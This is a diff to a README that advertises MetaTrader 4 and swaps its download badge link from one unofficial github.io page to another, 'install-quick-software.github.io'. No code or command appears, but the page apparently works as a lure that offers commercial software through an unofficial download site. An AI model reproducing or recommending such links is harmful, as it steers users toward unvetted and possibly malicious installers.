@@ -1,13 +1,13 @@
 # MetaTrader 4 – Professional Trading and Market Analysis Platform  
 
 <div align="center">  
-<img src="https://www.infinox-zh.com/img/trading-platforms/mt4/header.png" alt="MetaTrader 4 Logo" width="400">  
+<img src="https://www.infinox-zh.com/img/trading-platforms/mt4/header.png" alt="MetaTrader 4 Logo" width="350">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/metatrader-4">  
+<a href="https://install-quick-software.github.io/.github/metatrader-4">  
 <img src="https://img.shields.io/badge/💻_GET_MetaTrader_4-darkblue?style=for-the-badge&logo=apple" alt="GET MetaTrader 4">  
 </a>  
 </div>
